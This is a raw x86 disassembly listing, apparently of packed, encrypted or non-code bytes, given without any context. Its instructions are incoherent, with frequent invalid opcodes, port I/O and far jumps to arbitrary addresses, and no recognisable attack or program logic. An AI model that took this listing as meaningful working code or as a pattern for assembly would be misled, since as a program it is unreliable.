  40fd3e:	test   eax,ecx
  40fd40:	inc    ebx
  40fd41:	push   ebx
  40fd42:	and    DWORD PTR [ebp+0xe527d15],ecx
  40fd48:	fst    QWORD PTR [esp+ecx*1+0x49]
  40fd4c:	jno    0x40fda8
  40fd4e:	fild   WORD PTR [esi-0x47]
  40fd51:	rcl    BYTE PTR [ecx+0x1c8c43e1],1
  40fd57:	pushf  
  40fd58:	sub    al,0xdf
  40fd5a:	(bad)  
  40fd5b:	or     al,0x2a
  40fd5d:	mov    ah,0xbb
  40fd5f:	out    dx,al
  40fd60:	call   0xeb948eac
  40fd65:	fisttp QWORD PTR [ebx-0x24110f72]
  40fd6b:	cmp    esi,DWORD PTR [ecx-0x2c]
  40fd6e:	adc    DWORD PTR [ecx+0x3c72a1a4],esi
  40fd74:	retf   
  40fd75:	sub    ebp,esi
  40fd77:	mov    bl,0xb3
  40fd79:	cdq    
  40fd7a:	repnz xor eax,0xe87d0873
  40fd80:	xor    al,0x61
  40fd82:	pusha  
  40fd83:	pop    esi
  40fd84:	or     edi,ebx
  40fd86:	js     0x40fd7e
  40fd88:	mov    ecx,0xf2578670
  40fd8d:	mov    edi,0x2b951dfc
  40fd92:	cmp    ecx,DWORD PTR [edx]
  40fd94:	fidivr DWORD PTR [edx]
  40fd96:	fcmovnb st,st(7)
  40fd98:	pop    eax
  40fd99:	inc    edx
  40fd9a:	mov    ds:0x3e300319,al
  40fd9f:	in     al,dx
  40fda0:	jmp    0x40fde5
  40fda2:	dec    eax
  40fda3:	fst    st(3)
  40fda5:	mov    eax,0xdf0665ed
  40fdaa:	clc    
  40fdab:	(bad)  
  40fdad:	jno    0x40fd4c
  40fdaf:	xor    al,BYTE PTR [eax+0x6549fcdc]
  40fdb5:	in     al,dx
  40fdb6:	push   ebx
  40fdb7:	push   0x61
  40fdb9:	push   ebx
  40fdba:	cmp    al,0xc7
  40fdbc:	push   esi
  40fdbd:	or     eax,0xa0a13c8a
  40fdc2:	jo     0x40fd5c
  40fdc4:	stc    
  40fdc5:	pop    esi
  40fdc6:	xor    al,0x44
  40fdc8:	out    dx,al
  40fdc9:	lods   eax,DWORD PTR ds:[esi]
  40fdca:	and    DWORD PTR [eax+0x48268ac4],esp
  40fdd0:	cmp    DWORD PTR [ecx],0xffffff92
  40fdd3:	stos   DWORD PTR es:[edi],eax
  40fdd4:	mov    ebp,0x43ba08b8
  40fdd9:	(bad)  
  40fdda:	stos   DWORD PTR es:[edi],eax
  40fddb:	enter  0x5d6,0x3
  40fddf:	fild   QWORD PTR [ecx+ebx*4-0xa]
  40fde3:	xor    bl,bl
  40fde5:	mov    WORD PTR [ecx+0x17],gs
  40fde8:	jmp    0x40fe0e
  40fdea:	popa   
  40fdeb:	sbb    al,0xce
  40fded:	sub    al,0xd8
  40fdef:	(bad)  
  40fdf0:	jb     0x40fe6d
  40fdf2:	sbb    edi,esi
  40fdf4:	mov    ch,0xea
  40fdf6:	dec    ebx
  40fdf7:	and    al,0xec
  40fdf9:	lods   eax,DWORD PTR ds:[esi]
  40fdfa:	lods   eax,DWORD PTR ds:[esi]
  40fdfb:	xchg   esi,eax
  40fdfc:	aam    0xdc
  40fdfe:	add    al,0x32
  40fe00:	sbb    ebx,DWORD PTR [eax+edx*8]
  40fe03:	sbb    ecx,DWORD PTR [edi]
  40fe05:	cmp    edi,DWORD PTR [ebx-0x38]
  40fe08:	dec    ebp
  40fe09:	xor    BYTE PTR [edi-0x5d8b7dfe],ah
  40fe0f:	cwde   
  40fe10:	loop   0x40fdc8
  40fe12:	pusha  
  40fe13:	dec    eax
  40fe14:	retf   
  40fe15:	shr    BYTE PTR [edx],0xc2
  40fe18:	imul   ecx,ebx,0xb516c87f
  40fe1e:	arpl   sp,ax
  40fe20:	test   ebx,edi
  40fe22:	push   edi
  40fe23:	add    BYTE PTR ds:0xc1d202bf,bl
  40fe29:	and    bh,BYTE PTR ds:0x6b30fb23
  40fe2f:	(bad)  
  40fe30:	mov    eax,ds:0xec2b35df
  40fe35:	pop    ebx
  40fe36:	mov    dl,0x4f
  40fe38:	jo     0x40fdfc
  40fe3a:	cld    
  40fe3b:	sbb    BYTE PTR [ebp-0x75],ch
  40fe3e:	loop   0x40fdd8
  40fe40:	jmp    0x42de:0x2d94a464
  40fe47:	fisttp WORD PTR [edx-0x41]
  40fe4a:	(bad)  
  40fe4b:	fisubr DWORD PTR [ebx-0x31]
  40fe4e:	(bad)  
  40fe4f:	adc    ebx,ebp
  40fe51:	arpl   WORD PTR [eax+0x4e6c71b7],si
  40fe57:	mov    DWORD PTR [ebp-0x20],edx
  40fe5a:	je     0x40fe0e
  40fe5c:	inc    eax
  40fe5d:	inc    eax
  40fe5e:	mov    eax,ds:0x31416378
  40fe63:	jne    0x40fe47
  40fe65:	sbb    esi,DWORD PTR [ecx-0x38]
  40fe68:	loop   0x40feaf
  40fe6a:	retf   
  40fe6b:	leave  
  40fe6c:	inc    ebx
  40fe6d:	or     dh,BYTE PTR [ebx-0x4957842f]
  40fe73:	(bad)  
  40fe74:	jmp    0x40feaa
  40fe76:	mov    WORD PTR [eax+0xcfd1f2a],ds
  40fe7c:	hlt    
  40fe7d:	test   edx,ebx
  40fe7f:	pop    ds
  40fe80:	pop    edi
  40fe81:	imul   ebx,DWORD PTR [ecx-0x38],0xffffff98
  40fe85:	inc    esp
  40fe86:	imul   edx,esi,0x89e7b938
  40fe8c:	add    BYTE PTR [esi+0x71],ch
  40fe8f:	adc    DWORD PTR [edi],ebx
  40fe91:	pop    edi
  40fe92:	adc    BYTE PTR [edx],ah
  40fe94:	sar    dh,1
  40fe96:	stos   BYTE PTR es:[edi],al
  40fe97:	mov    esp,DWORD PTR [eax+0x4bea7603]
  40fe9d:	fbstp  TBYTE PTR [ebx]
  40fe9f:	sub    bh,BYTE PTR [edx+0x76]
  40fea2:	mov    al,ds:0x177aeb39
  40fea7:	adc    dl,BYTE PTR [ebp-0x7e0fdfc0]
  40fead:	fisttp WORD PTR [esp+ecx*8+0xc]
  40feb1:	in     al,dx
  40feb2:	cmp    DWORD PTR [edi-0x70029f2b],esi
  40feb8:	arpl   WORD PTR [esi+0x22f8eae6],di
  40febe:	push   edx
  40febf:	enter  0xcbd9,0x70
  40fec3:	ficom  WORD PTR [ecx-0x149eb23c]
  40fec9:	or     al,0x65
  40fecb:	jne    0x40fe63
  40fecd:	inc    ecx
  40fece:	ja     0x40fe5b
  40fed0:	rcr    al,cl
  40fed2:	add    al,0x5e
  40fed4:	xchg   ebx,eax
  40fed5:	pop    ss
  40fed6:	mov    ebp,0xc8abe4a6
  40fedb:	cld    
  40fedc:	in     al,0x3d
  40fede:	ins    BYTE PTR es:[edi],dx
  40fedf:	dec    ebx
  40fee0:	inc    ebx
  40fee1:	or     DWORD PTR [esi-0x13],eax
  40fee4:	pop    ebx
  40fee5:	fisub  WORD PTR [esi]
  40fee7:	inc    esi
  40fee8:	icebp  
  40fee9:	aam    0x83
  40feeb:	jmp    0xa1f8fede
  40fef0:	in     eax,dx
  40fef1:	(bad)  
  40fef3:	fcomp  st(3)
  40fef5:	and    BYTE PTR [edx*1+0x65d85f44],al
  40fefc:	pop    ds
  40fefd:	xchg   ebp,eax
  40fefe:	ds enter 0x6ccd,0xbb
  40ff03:	pop    ds
  40ff04:	stos   DWORD PTR es:[edi],eax
  40ff05:	add    edx,esi
  40ff07:	dec    ecx
  40ff08:	jmp    0x40fedc
  40ff0a:	rcr    DWORD PTR [ebx-0x6f47ca43],1
  40ff10:	in     eax,0xe2
  40ff12:	mov    ebx,0x8268d9d2
  40ff17:	retf   
  40ff18:	pop    ebp
  40ff19:	leave  
  40ff1a:	or     BYTE PTR [ecx],0x73
  40ff1d:	jno    0x40ff7f
  40ff1f:	fwait
  40ff20:	jmp    0x40ff5c
  40ff22:	sbb    edi,DWORD PTR [edx-0x261b4c24]
  40ff28:	cmp    eax,0x4567dadf
  40ff2d:	sbb    al,0x0
  40ff2f:	xchg   ecx,eax
  40ff30:	mov    esi,0xcebbfd2d
  40ff35:	mov    bh,0x5f
  40ff37:	sbb    ah,BYTE PTR [ebp-0xc34a45a]
  40ff3d:	pop    edx
  40ff3e:	mov    DWORD PTR [ecx],ecx
  40ff40:	mov    esi,edi
  40ff42:	test   BYTE PTR [ecx-0x70],bl
  40ff45:	es std 
  40ff47:	dec    ebx
  40ff48:	mov    esp,0xe27d8e1
  40ff4d:	xor    BYTE PTR [esi+0x3dfd218],0x99
  40ff54:	sub    eax,0xca635667
  40ff59:	fcomi  st,st(2)
  40ff5b:	(bad)  
  40ff5c:	ror    BYTE PTR [ebx-0x64],0x8
  40ff60:	daa    
  40ff61:	mov    ?,WORD PTR [ebx+0x6add15fa]
  40ff67:	and    ebx,DWORD PTR [ebx]
  40ff69:	pusha  
  40ff6a:	push   ebp
  40ff6b:	imul   BYTE PTR [ebx-0x208655c1]
  40ff71:	jg     0x40ff8b
  40ff73:	dec    eax
  40ff74:	and    al,0xb8
  40ff76:	pop    edi
  40ff77:	sub    al,0xe
  40ff79:	push   ebx
  40ff7a:	fidivr DWORD PTR [ecx+eiz*8-0x54033bb3]
  40ff81:	fistp  QWORD PTR [edi-0x4a]
  40ff84:	mov    ebx,0xe7efd916
  40ff89:	iret   
  40ff8a:	(bad)  
  40ff8b:	sub    bh,BYTE PTR [esi+0x2dce7c07]
  40ff91:	jg     0x40ffa9
  40ff93:	in     eax,0x5c
  40ff95:	cmp    al,0xe6
  40ff97:	mov    edx,0xc8982824
  40ff9c:	rcr    BYTE PTR [esp+eiz*2+0x1b],0xb3
  40ffa1:	mov    cl,0xfc
  40ffa3:	mov    dh,0x28
  40ffa5:	fwait
  40ffa6:	sbb    al,0x99
  40ffa8:	mov    al,ds:0xa6c8c569
  40ffad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffae:	shl    BYTE PTR ss:[ebx+edx*1+0x5a],1
  40ffb3:	inc    edx
  40ffb4:	jmp    0x40ff6a
  40ffb6:	fld    QWORD PTR [eax+0x3a]
  40ffb9:	push   edx
  40ffba:	push   eax
  40ffbb:	mov    bh,0x8f
  40ffbd:	fdiv   st(2),st
  40ffbf:	push   0xffffffd2
  40ffc1:	mov    eax,0xfc0b0e3d
  40ffc6:	stos   DWORD PTR es:[edi],eax
  40ffc7:	mov    ebx,0x706438e9
  40ffcc:	xchg   BYTE PTR [ebp+0x61],bl
  40ffcf:	mov    BYTE PTR [edx+eax*8+0x31],bh
  40ffd3:	retf   
  40ffd4:	ja     0x410034
  40ffd6:	mov    WORD PTR [ecx-0x4272fbc8],fs
  40ffdc:	add    ah,BYTE PTR [esi]
  40ffde:	std    
  40ffdf:	xchg   DWORD PTR [ebp+esi*1-0x10b16c2d],edx
  40ffe6:	(bad)  
  40ffe7:	loope  0x40ff9f
  40ffe9:	mov    ?,WORD PTR [ebp+0x52]
  40ffec:	jmp    0xfd65:0xc44eccbd
  40fff3:	pop    edi
  40fff4:	aad    0xbb
  40fff6:	fst    DWORD PTR [ebx+0x4d]
  40fff9:	mov    esp,0x6417bc83
  40fffe:	mov    cs,WORD PTR [eax-0x67f6d248]
  410004:	cmc    
  410005:	xchg   ch,bh
  410007:	and    BYTE PTR [edx],0xbe
  41000a:	add    al,0xd2
  41000c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41000d:	inc    edx
  41000e:	sar    BYTE PTR [ebx+edx*1-0x6cb03df8],cl
  410015:	fsqrt  
  410017:	adc    eax,0x95fd55fe
  41001c:	js     0x41004a
  41001e:	add    eax,0x78be3fc1
  410023:	mov    ebp,0xf75feaec
  410028:	or     eax,DWORD PTR [edi-0x5c8f3656]
  41002e:	sbb    ecx,edi
  410030:	adc    eax,0x5a3cb8e7
  410035:	fistp  WORD PTR [ebp-0x68]
  410038:	lods   al,BYTE PTR ds:[esi]
  410039:	int    0xb5
  41003b:	push   eax
  41003c:	hlt    
  41003d:	into   
  41003e:	cld    
  41003f:	mov    cl,0x37
  410041:	pop    dx
  410043:	retf   
  410044:	mov    edx,0xc80f51
  410049:	jg     0x4100c9
  41004b:	(bad)  
  41004c:	arpl   WORD PTR [ecx],ax
  41004e:	popa   
  41004f:	icebp  
  410050:	jmp    0x41006c
  410052:	sbb    ebp,DWORD PTR [edx+0x7d967ce9]
  410058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410059:	enter  0xc8a8,0x9a
  41005d:	inc    edi
  41005e:	rcr    DWORD PTR [esi],1
  410060:	in     al,dx
  410061:	ins    DWORD PTR es:[edi],dx
  410062:	(bad)  
  410063:	cmc    
  410064:	in     al,dx
  410065:	neg    DWORD PTR [edi-0x43b23552]
  41006b:	(bad)  
  41006c:	sub    DWORD PTR [esi],edi
  41006e:	xchg   ebx,eax
  41006f:	mov    WORD PTR [esi+0x4908ed55],fs
  410075:	mov    ds:0xfa81df9e,eax
  41007a:	add    ah,dh
  41007c:	and    ch,BYTE PTR [edx+ecx*1-0x28020138]
  410083:	mov    ebp,0x82fdb5dc
  410088:	bound  edi,QWORD PTR [ebx]
  41008a:	inc    ebx
  41008b:	aaa    
  41008c:	dec    edi
  41008d:	dec    esp
  41008e:	xchg   ecx,eax
  41008f:	sub    eax,0x884ddfa7
  410094:	out    0xc7,al
  410096:	mov    ds:0x9af88e,eax
  41009b:	pop    edx
  41009c:	fcmovbe st,st(3)
  41009e:	std    
  41009f:	jle    0x410092
  4100a1:	rol    BYTE PTR [ebx+0x1797270b],cl
  4100a7:	enter  0x4aa0,0xc1
  4100ab:	mov    bh,0xac
  4100ad:	jb     0x4100ff
  4100af:	jno    0x410076
  4100b1:	xor    eax,ebx
  4100b3:	adc    eax,0x667de9eb
  4100b8:	das    
  4100b9:	cmp    al,0x93
  4100bb:	enter  0x4bd4,0x95
  4100bf:	clc    
  4100c0:	mov    fs,WORD PTR [ebp+0x19]
  4100c3:	xor    al,0xeb
  4100c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100c6:	hlt    
  4100c7:	mov    al,ds:0x6148f348
  4100cc:	inc    edx
  4100cd:	fbstp  TBYTE PTR [edx+0x217489dc]
  4100d3:	jmp    0x4100e0
  4100d5:	in     al,0xfc
  4100d7:	push   ds
  4100d8:	xor    BYTE PTR [esi],0xb4
  4100db:	push   ds
  4100dc:	jge    0x4100a3
  4100de:	push   esi
  4100df:	enter  0x8c7b,0xe2
  4100e3:	(bad)  
  4100e4:	mov    esi,ss
  4100e6:	cmp    eax,0x2e59ebb0
  4100eb:	cli    
  4100ec:	sti    
  4100ed:	jo     0x410121
  4100ef:	inc    edi
  4100f0:	and    BYTE PTR [ebx-0x1d],cl
  4100f3:	(bad)  
  4100f4:	daa    
  4100f5:	jp     0x410124
  4100f7:	aas    
  4100f8:	pop    ebp
  4100f9:	and    eax,0xfeb11e8
  4100fe:	mov    ch,0x5f
  410100:	fs mov edx,0xdfadd6ba
  410106:	or     cl,dl
  410108:	outs   dx,DWORD PTR ds:[esi]
  410109:	cli    
  41010a:	xchg   ebx,eax
  41010b:	cs mov edx,0xe48effab
  410111:	mov    esi,0x875a3612
  410116:	jae    0x4100ab
  410118:	std    
  410119:	fist   WORD PTR [esi-0x4d]
  41011c:	and    ah,cl
  41011e:	jae    0x410106
  410120:	ds jb  0x410120
  410123:	adc    eax,0x3b1b40b3
  410128:	cmp    DWORD PTR [eax+ecx*1],ebp
  41012b:	enter  0xf99d,0xe1
  41012f:	jne    0x410104
  410131:	mov    bh,0xd3
  410133:	sbb    ch,bl
  410135:	jge    0x41016c
  410137:	enter  0x389e,0xe1
  41013b:	shl    edx,1
  41013d:	xor    BYTE PTR [esi-0x38],bh
  410140:	out    dx,al
  410141:	cmp    al,0x95
  410143:	push   cs
  410144:	inc    ebp
  410145:	inc    ebx
  410146:	mov    eax,0xfd4b5b9d
  41014b:	mov    dh,0x7b
  41014d:	loop   0x410197
  41014f:	es push ss
  410151:	or     al,0x1d
  410153:	iret   
  410154:	in     al,dx
  410155:	add    BYTE PTR [eax],dh
  410157:	pop    es
  410158:	or     esi,DWORD PTR [esi+0x7a451494]
  41015e:	std    
  41015f:	add    eax,0x176942c9
  410164:	dec    esi
  410165:	xor    bl,BYTE PTR [edi+edi*4]
  410168:	out    0x72,al
  41016a:	pop    eax
  41016b:	or     BYTE PTR [edi+edx*2],cl
  41016e:	xchg   esi,eax
  41016f:	inc    esi
  410170:	sar    edi,0xf2
  410173:	jnp    0x410150
  410175:	mov    cl,0xb6
  410177:	enter  0x2dd6,0x4a
  41017b:	jnp    0x410152
  41017d:	fbld   TBYTE PTR [esi+0x65]
  410180:	sti    
  410181:	les    eax,FWORD PTR [bp+di+0x36]
  410185:	inc    eax
  410186:	std    
  410187:	xchg   ecx,eax
  410188:	xlat   BYTE PTR ds:[ebx]
  410189:	pop    edx
  41018a:	outs   dx,DWORD PTR ds:[esi]
  41018b:	sub    BYTE PTR [edx+edx*1],0x9f
  41018f:	sbb    al,0x4c
  410191:	(bad)  
  410192:	mov    DWORD PTR ds:[ebx],0x1c1e09e4
  410199:	sbb    eax,0xc72b7082
  41019e:	inc    esi
  41019f:	or     eax,0x9bb422ec
  4101a4:	pop    ebx
  4101a5:	out    0x4a,eax
  4101a7:	test   BYTE PTR [edi],cl
  4101a9:	jnp    0x4101a5
  4101ab:	mov    DWORD PTR [edx-0x52],0x12c26cd2
  4101b2:	pop    ebp
  4101b3:	jmp    0x4d4b1a3
  4101b8:	into   
  4101b9:	popa   
  4101ba:	add    al,0x1c
  4101bc:	pop    esi
  4101bd:	fist   WORD PTR [esi-0x19618f28]
  4101c3:	clc    
  4101c4:	(bad)  
  4101c5:	and    ch,bh
  4101c7:	pop    eax
  4101c8:	push   ds
  4101c9:	and    ch,BYTE PTR [ebx]
  4101cb:	mov    dh,0xbf
  4101cd:	mov    dh,0x2e
  4101cf:	inc    eax
  4101d0:	mov    edi,0x115cd5df
  4101d5:	ficom  DWORD PTR [edi-0x6f4bcea0]
  4101db:	hlt    
  4101dc:	jmp    0x41020f
  4101de:	rcl    DWORD PTR [ebp+0x13],cl
  4101e1:	(bad)  [esp+edi*4]
  4101e4:	push   edx
  4101e5:	fistp  QWORD PTR [esi]
  4101e7:	and    edi,DWORD PTR [esi+edx*1-0x47]
  4101eb:	mov    ch,0xf7
  4101ed:	mov    ch,bh
  4101ef:	(bad)  
  4101f1:	shr    edx,1
  4101f3:	loope  0x410192
  4101f5:	pop    ebp
  4101f6:	fld    st(7)
  4101f8:	lods   eax,DWORD PTR ds:[esi]
  4101f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101fa:	dec    ecx
  4101fb:	xchg   ebp,eax
  4101fc:	jno    0x4101a0
  4101fe:	pusha  
  4101ff:	out    0x97,al
  410201:	ret    
  410202:	sub    eax,0xe8f3eb12
  410207:	mov    bh,0xd3
  410209:	ror    DWORD PTR [edi-0x7d],0x6c
  41020d:	or     BYTE PTR [edi+0x51],ah
  410210:	imul   ecx,DWORD PTR [esi-0x1281182e],0x17
  410217:	cmp    esp,DWORD PTR [ecx]
  410219:	ss std 
  41021b:	inc    edi
  41021c:	mov    ah,0xee
  41021e:	jmp    0x4101ab
  410220:	mov    bh,0x22
  410222:	push   0xc4a790c8
  410227:	call   0x71eb:0xa54f8c4a
  41022e:	pop    ebx
  41022f:	loop   0x410233
  410231:	jmp    0xdfd00ffb
  410236:	js     0x41023a
  410238:	not    DWORD PTR [ecx+0x31ccef02]
  41023e:	std    
  41023f:	cdq    
  410240:	out    0x6c,al
  410242:	(bad)  
  410243:	jmp    0x2223:0xc75a10c5
  41024a:	and    BYTE PTR [esi+0x74d31e83],0x45
  410251:	inc    ebx
  410252:	inc    eax
  410253:	push   edi
  410254:	jmp    0x41020f
  410256:	xchg   ebx,eax
  410257:	scas   eax,DWORD PTR es:[edi]
  410258:	adc    BYTE PTR [edi+0x4fb6b77a],cl
  41025e:	xchg   eax,ecx
  410260:	out    dx,eax
  410261:	add    eax,0xfb06c368
  410266:	mov    ebx,0xfd6a215c
  41026b:	sub    esp,DWORD PTR [esi-0x3a]
  41026e:	shl    DWORD PTR [esi],cl
  410270:	test   al,0xb5
  410272:	xchg   BYTE PTR [esi-0x5f9e36d7],bl
  410278:	retf   0x53df
  41027b:	bound  ebp,QWORD PTR [esi+eiz*1]
  41027e:	cld    
  41027f:	pop    edx
  410280:	cs ret 
  410282:	call   esi
  410284:	xchg   ebp,eax
  410285:	or     DWORD PTR [edx+0x68],esi
  410288:	mov    bl,0x77
  41028a:	emms   
  41028c:	lahf   
  41028d:	ffreep st(1)
  41028f:	jne    0x4102a8
  410291:	mov    ecx,0x8785efba
  410296:	fldenv [eax]
  410298:	push   0x2f89fc39
  41029d:	mov    edi,0xc615ac1c
  4102a2:	ins    DWORD PTR es:[edi],dx
  4102a3:	(bad)  
  4102a5:	pop    eax
  4102a6:	std    
  4102a7:	lock dec edx
  4102a9:	cmp    ch,al
  4102ab:	sbb    cl,dl
  4102ad:	leave  
  4102ae:	cld    
  4102af:	mov    ebx,0x843189ab
  4102b4:	int    0x7f
  4102b6:	lahf   
  4102b7:	rcl    BYTE PTR [edi-0x6b],0xa3
  4102bb:	(bad)  
  4102bc:	xor    DWORD PTR [eax+0x60a09ffc],ebx
  4102c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102c3:	cs sti 
  4102c5:	add    bh,BYTE PTR [edx-0x37]
  4102c8:	outs   dx,BYTE PTR cs:[esi]
  4102ca:	loope  0x41033d
  4102cc:	lds    edi,FWORD PTR [ebp+0x3228300a]
  4102d2:	std    
  4102d3:	scas   al,BYTE PTR es:[edi]
  4102d4:	or     BYTE PTR [eax-0x7],bh
  4102d7:	pop    ecx
  4102d8:	test   al,0xd
  4102da:	mov    eax,0x120818c8
  4102df:	jp     0x410333
  4102e1:	jle    0x410333
  4102e3:	cmc    
  4102e4:	jmp    0x4102c3
  4102e6:	mov    al,0x99
  4102e8:	mov    ah,0x9d
  4102ea:	jae    0x410286
  4102ec:	inc    esp
  4102ed:	fisttp WORD PTR [ecx-0x61]
  4102f0:	inc    eax
  4102f1:	inc    edx
  4102f2:	push   edi
  4102f3:	out    0xd2,eax
  4102f5:	sar    edi,1
  4102f7:	ret    
  4102f8:	push   0xac6a51be
  4102fd:	push   0xd494903d
  410302:	(bad)  
  410303:	sub    DWORD PTR [eax-0x18],ebx
  410306:	push   0xb5df0df1
  41030b:	lods   eax,DWORD PTR ds:[esi]
  41030c:	imul   dl
  41030e:	out    dx,al
  41030f:	push   0xffffffeb
  410311:	popf   
  410312:	and    BYTE PTR [eax+0x14],bl
  410315:	or     BYTE PTR fs:[edx],0xf2
  410319:	fild   QWORD PTR [ecx+edi*4]
  41031c:	sbb    BYTE PTR [ebp+0x1c],0xfe
  410320:	aaa    
  410321:	(bad)  
  410323:	jb     0x4102e3
  410325:	std    
  410326:	mov    edx,0xd65f8d3b
  41032b:	and    edi,esi
  41032d:	cmp    eax,0x6669d174
  410332:	mov    ?,WORD PTR ds:[ebx]
  410335:	add    bh,ch
  410337:	out    dx,eax
  410338:	jle    0x410316
  41033a:	cs das 
  41033c:	mov    dh,0xfe
  41033e:	enter  0x9e9f,0xd8
  410342:	retf   
  410343:	xchg   ecx,eax
  410344:	(bad)  
  410346:	jl     0x41039b
  410348:	cwde   
  410349:	into   
  41034a:	scas   al,BYTE PTR es:[edi]
  41034b:	jle    0x410338
  41034d:	and    BYTE PTR [esi-0x66],0x5a
  410351:	jo     0x4103cc
  410353:	or     al,ah
  410355:	push   ebx
  410356:	dec    esi
  410357:	enter  0x3b91,0x5f
  41035b:	add    BYTE PTR [ebp-0x78],ch
  41035e:	sbb    al,0xf
  410360:	jmp    0x41033b
  410362:	mov    ch,0x97
  410364:	test   ebx,ebx
  410366:	inc    esi
  410367:	in     eax,0xc7
  410369:	fcomp  QWORD PTR [edx-0xe]
  41036c:	int3   
  41036d:	jae    0x4103ee
  41036f:	jle    0x4103d8
  410371:	pop    edi
  410372:	xchg   ebp,eax
  410373:	dec    esp
  410374:	pop    ds
  410375:	es std 
  410377:	push   eax
  410378:	add    eax,0x3a0823c4
  41037d:	cmc    
  41037e:	cli    
  41037f:	(bad)  
  410380:	popf   
  410381:	xor    al,0x7d
  410383:	adc    DWORD PTR [esi+ebp*8],ecx
  410386:	mov    DWORD PTR [eax-0x17],eax
  410389:	xchg   edx,eax
  41038a:	arpl   bx,cx
  41038c:	ds pusha 
  41038e:	ins    DWORD PTR es:[edi],dx
  41038f:	dec    eax
  410390:	dec    eax
  410391:	mov    ebp,0xdf0efca0
  410396:	bnd jl 0x4103c2
  410399:	int    0xad
  41039b:	cmp    BYTE PTR [edx],bh
  41039d:	stc    
  41039e:	sub    dh,al
  4103a0:	mov    ds:0x1e7a1003,eax
  4103a5:	mov    cl,0xfc
  4103a7:	stos   DWORD PTR es:[edi],eax
  4103a8:	aas    
  4103a9:	leave  
  4103aa:	push   0xffffffa6
  4103ac:	pop    edi
  4103ad:	fnstenv [esi+ecx*2-0x3582dbb3]
  4103b4:	(bad)  
  4103b6:	sub    edi,DWORD PTR [ecx-0x15]
  4103b9:	xchg   ebx,eax
  4103ba:	jb     0x4103c2
  4103bc:	not    DWORD PTR [ecx]
  4103be:	rol    DWORD PTR [eax],1
  4103c0:	inc    ecx
  4103c1:	fistp  WORD PTR [edx+0x7568c956]
  4103c7:	hlt    
  4103c8:	sbb    DWORD PTR [ebx-0x3],ecx
  4103cb:	dec    ebp
  4103cc:	mov    ecx,DWORD PTR [edi]
  4103ce:	inc    esp
  4103cf:	lahf   
  4103d0:	(bad)  
  4103d1:	leave  
  4103d2:	pop    ecx
  4103d3:	xchg   ebp,eax
  4103d4:	arpl   bx,bp
  4103d6:	nop
  4103d7:	cmp    cl,BYTE PTR [eax-0x46dc0261]
  4103dd:	inc    edi
  4103de:	jnp    0x4103ca
  4103e0:	lahf   
  4103e1:	aaa    
  4103e2:	std    
  4103e3:	ins    BYTE PTR es:[edi],dx
  4103e4:	adc    dl,0x26
  4103e7:	pop    edx
  4103e8:	(bad)  
  4103e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ea:	stos   DWORD PTR es:[edi],eax
  4103eb:	enter  0x90ad,0x19
  4103ef:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4103f1:	pop    ebx
  4103f2:	arpl   WORD PTR [ebp-0x15],di
  4103f5:	cmp    ch,dh
  4103f7:	ror    al,cl
  4103f9:	jne    0x410385
  4103fb:	lock xchg edi,eax
  4103fd:	fisttp WORD PTR [edi-0x55119db6]
  410403:	pop    ecx
  410404:	cdq    
  410405:	mov    ebx,0xb6454ef2
  41040a:	fs pop ds
  41040c:	imul   ebx,DWORD PTR [edi],0xfffffff1
  41040f:	fnsave [eax]
  410411:	mov    al,0x57
  410413:	loopne 0x4103c3
  410415:	dec    esp
  410416:	std    
  410417:	mov    dl,0xb2
  410419:	dec    ebp
  41041a:	xchg   BYTE PTR [esi-0xf0365ce],dh
  410420:	dec    esi
  410421:	outs   dx,BYTE PTR ds:[esi]
  410422:	js     0x4103e4
  410424:	sti    
  410425:	gs cmc 
  410427:	mov    DWORD PTR [edx],0xb1b14986
  41042d:	(bad)  
  41042e:	xchg   ebx,ecx
  410430:	stc    
  410431:	fwait
  410432:	cmp    DWORD PTR [esi],edi
  410434:	jmp    0x4104a9
  410436:	test   al,0xca
  410438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410439:	adc    bl,al
  41043b:	enter  0x7016,0xe1
  41043f:	mov    DWORD PTR [ecx-0x1427a862],esi
  410445:	mov    esp,0x4bae04f0
  41044a:	xor    DWORD PTR [eax+ebx*4-0x21],0x83a7c4ee
  410452:	in     al,0xf9
  410454:	xchg   esp,esi
  410456:	cld    
  410457:	mov    ah,0x77
  410459:	xchg   ebp,eax
  41045a:	jmp    0xb2317307
  41045f:	enter  0x2e54,0x8a
  410463:	and    BYTE PTR [eax],cl
  410465:	pushf  
  410466:	lock push esi
  410468:	jmp    0x4104c3
  41046a:	mov    eax,0xa3c222bd
  41046f:	call   0xdc79:0x269d7fdf
  410476:	sbb    ecx,0xffffffb3
  410479:	xor    cl,BYTE PTR [ebx+edi*1+0x53]
  41047d:	cmp    ah,BYTE PTR [ecx-0x1d6144e]
  410483:	push   ebp
  410484:	push   ds
  410485:	sbb    DWORD PTR [ebp+0x3504fbea],ecx
  41048b:	(bad)  
  41048c:	jmp    0x41045e
  41048e:	scas   al,BYTE PTR es:[edi]
  41048f:	sbb    eax,0xbff26b94
  410494:	and    bh,BYTE PTR [ebx]
  410496:	add    edx,ebp
  410498:	in     al,0xbf
  41049a:	loope  0x410463
  41049c:	gs addr16 dec ebp
  41049f:	jb     0x41050a
  4104a1:	and    dh,BYTE PTR [edx-0x38]
  4104a4:	jl     0x41046f
  4104a6:	fimul  DWORD PTR [edx-0x67]
  4104a9:	retf   0x25e
  4104ac:	jmp    0x410449
  4104ae:	mov    ds:0x1de2b7d5,al
  4104b3:	pop    ebx
  4104b4:	sub    bh,bl
  4104b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b7:	sub    BYTE PTR [edx-0x3d620c07],ch
  4104bd:	sar    ah,cl
  4104bf:	mov    ds:0xb9375a20,al
  4104c4:	jle    0x4104be
  4104c6:	(bad)  
  4104c7:	sahf   
  4104c8:	sbb    al,0xd3
  4104ca:	in     al,0xc7
  4104cc:	xchg   cl,dh
  4104ce:	std    
  4104cf:	(bad)  
  4104d0:	mov    ebx,0xf1ebcdf7
  4104d5:	jl     0x4104c2
  4104d7:	adc    DWORD PTR ds:0x1580fd6a,esi
  4104dd:	data16 aas 
  4104df:	and    eax,0xcc0bdf1c
